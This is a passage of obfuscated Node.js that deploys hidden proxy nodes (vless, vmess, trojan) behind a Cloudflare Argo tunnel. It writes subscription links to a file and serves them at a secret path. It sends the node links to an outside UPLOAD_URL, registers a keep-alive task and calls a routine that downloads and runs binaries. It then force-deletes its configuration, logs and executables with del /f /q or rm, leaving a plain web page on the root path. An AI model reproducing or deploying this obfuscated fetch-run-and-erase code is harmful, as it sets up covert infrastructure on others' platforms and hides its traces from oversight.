_0x5cc9c1=_0xb1f5,_0x5a102e={'v':'2','ps':''+_0x430142,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'auto','net':'ws','type':_0x5cc9c1(0x106),'host':_0x3a715b,'path':_0x5cc9c1(0xc7),'tls':'tls','sni':_0x3a715b,'alpn':'','fp':_0x5cc9c1(_0x5cfaef._0x17e767)},_0x5cf98d=_0x5cc9c1(_0x5cfaef._0x1275fa)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x3a715b+_0x5cc9c1(0xa4)+_0x3a715b+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x430142+_0x5cc9c1(0xb2)+Buffer[_0x5cc9c1(0xfa)](JSON[_0x5cc9c1(_0x5cfaef._0x377f25)](_0x5a102e))[_0x5cc9c1(0x7f)](_0x5cc9c1(_0x5cfaef._0x494161))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x5cc9c1(0x101)+_0x3a715b+'&fp=firefox&type=ws&host='+_0x3a715b+_0x5cc9c1(_0x5cfaef._0x533657)+_0x430142+'\x0a\x20\x20\x20\x20';console[_0x5cc9c1(0xb1)](Buffer[_0x5cc9c1(_0x5cfaef._0x51dcf1)](_0x5cf98d)[_0x5cc9c1(_0x5cfaef._0x451f91)](_0x5cc9c1(_0x5cfaef._0x49e8a4))),fs['writeFileSync'](subPath,Buffer[_0x5cc9c1(_0x5cfaef._0x144313)](_0x5cf98d)[_0x5cc9c1(_0x5cfaef._0x451f91)](_0x5cc9c1(0x8a))),console[_0x5cc9c1(_0x5cfaef._0x109843)](FILE_PATH+_0x5cc9c1(0x8f)),uploadNodes(),app[_0x5cc9c1(_0x5cfaef._0x39a70a)]('/'+SUB_PATH,(_0x381bb7,_0x285e63)=>{const _0x2d903d=_0x5cc9c1,_0x3dc9ce=Buffer[_0x2d903d(0xfa)](_0x5cf98d)[_0x2d903d(_0x32f587._0x362a0e)](_0x2d903d(_0x32f587._0x45c000));_0x285e63[_0x2d903d(_0x32f587._0x4dcb75)](_0x2d903d(_0x32f587._0x571155),_0x2d903d(0xb3)),_0x285e63['send'](_0x3dc9ce);}),_0x132d71(_0x5cf98d);},0x7d0);});}}async function uploadNodes(){const _0x5ef94a={_0x328412:0xb6,_0x2287d3:0xc6,_0x1a3a3b:0xb1,_0x240199:0x122,_0x42fbb6:0x70,_0x15e4c8:0x71,_0x24d53d:0xd7,_0x1f4d1e:0xae,_0x12bff8:0xf3,_0x8927ff:0xb1},_0x3800be=_0x5f2aab;if(UPLOAD_URL&&PROJECT_URL){const _0x1420aa=PROJECT_URL+'/'+SUB_PATH,_0x44cb0f={'subscription':[_0x1420aa]};try{const _0x4c862c=await axios[_0x3800be(0x99)](UPLOAD_URL+_0x3800be(_0x5ef94a._0x328412),_0x44cb0f,{'headers':{'Content-Type':_0x3800be(_0x5ef94a._0x2287d3)}});return _0x4c862c&&_0x4c862c[_0x3800be(0xf3)]===0xc8?(console[_0x3800be(_0x5ef94a._0x1a3a3b)](_0x3800be(_0x5ef94a._0x240199)),_0x4c862c):null;}catch(_0x52de95){if(_0x52de95[_0x3800be(_0x5ef94a._0x42fbb6)]){if(_0x52de95['response'][_0x3800be(0xf3)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3800be(_0x5ef94a._0x15e4c8)](listPath))return;const _0x168114=fs[_0x3800be(_0x5ef94a._0x24d53d)](listPath,_0x3800be(_0x5ef94a._0x1f4d1e)),_0x39794a=_0x168114['split']('\x0a')[_0x3800be(0x115)](_0x3bcf53=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3800be(0x126)](_0x3bcf53));if(_0x39794a[_0x3800be(0x9f)]===0x0)return;const _0x4cae17=JSON['stringify']({'nodes':_0x39794a});try{const _0x451e58=await axios[_0x3800be(0x99)](UPLOAD_URL+'/api/add-nodes',_0x4cae17,{'headers':{'Content-Type':_0x3800be(0xc6)}});return _0x451e58&&_0x451e58[_0x3800be(_0x5ef94a._0x12bff8)]===0xc8?(console[_0x3800be(_0x5ef94a._0x8927ff)]('Nodes\x20uploaded\x20successfully'),_0x451e58):null;}catch(_0x56c083){return null;}}else return;}}function cleanFiles(){const _0x52ec28={_0x53c264:0xeb,_0x4c6f80:0xb9},_0x4bcaa0={_0x4e7ce0:0xa1,_0x38f2c9:0xb1},_0x80987a={_0x1a2fac:0xb1,_0x2e5014:0x116};setTimeout(()=>{const _0x582dbd=_0xb1f5,_0x150da1=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x150da1[_0x582dbd(0x86)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x150da1['push'](phpPath);process['platform']===_0x582dbd(0x103)?exec('del\x20/f\x20/q\x20'+_0x150da1['join']('\x20')+'\x20>\x20nul\x202>&1',_0x60f0a6=>{const _0x2b6ea0=_0x582dbd;console[_0x2b6ea0(0x129)](),console['log'](_0x2b6ea0(0xa1)),console[_0x2b6ea0(_0x80987a._0x1a2fac)](_0x2b6ea0(_0x80987a._0x2e5014));}):exec(_0x582dbd(0x11f)+_0x150da1[_0x582dbd(_0x52ec28._0x53c264)]('\x20')+_0x582dbd(_0x52ec28._0x4c6f80),_0x2fcf05=>{const _0x21a6ee=_0x582dbd;console[_0x21a6ee(0x129)](),console[_0x21a6ee(0xb1)](_0x21a6ee(_0x4bcaa0._0x4e7ce0)),console[_0x21a6ee(_0x4bcaa0._0x38f2c9)](_0x21a6ee(0x116));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2be6c5={_0x18e341:0xc6,_0x82c9db:0xc2},_0x16dccb=_0x5f2aab;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x16dccb(0xb1)](_0x16dccb(0xdf));return;}try{const _0x310a47=await axios[_0x16dccb(0x99)](_0x16dccb(0x100),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x16dccb(_0x2be6c5._0x18e341)}});return console[_0x16dccb(0xb1)]('automatic\x20access\x20task\x20added\x20successfully'),_0x310a47;}catch(_0x5be8da){return console[_0x16dccb(0x98)](_0x16dccb(_0x2be6c5._0x82c9db)+_0x5be8da['message']),null;}}async function startserver(){const _0x4b3c8c={_0x107296:0x7d},_0x2e9501=_0x5f2aab;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2cea32){console[_0x2e9501(0x98)](_0x2e9501(_0x4b3c8c._0x107296),_0x2cea32);}}startserver()[_0x5f2aab(0xe7)](_0x361267=>{const _0x10975c={_0x3d05ff:0xbe},_0x369a34=_0x5f2aab;console['error'](_0x369a34(_0x10975c._0x3d05ff),_0x361267);}),app[_0x5f2aab(0xdd)]('/',async function(_0xbf0aca,_0x1e31a5){const _0x5e536e={_0x27ce5b:0xef,_0x4a33b7:0xed,_0x4fa5f6:0xbf,_0x3d6e90:0x81},_0x2a968c=_0x5f2aab;try{const _0x49a746=path[_0x2a968c(0xeb)](__dirname,_0x2a968c(0xc3)),_0x2c0a25=await fs[_0x2a968c(_0x5e536e._0x27ce5b)][_0x2a968c(0xbd)](_0x49a746,_0x2a968c(_0x5e536e._0x4a33b7));_0x1e31a5[_0x2a968c(_0x5e536e._0x4fa5f6)](_0x2c0a25);}catch(_0x5a21bc){_0x1e31a5['send'](_0x2a968c(_0x5e536e._0x3d6e90));}}),app[_0x5f2aab(0x10d)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
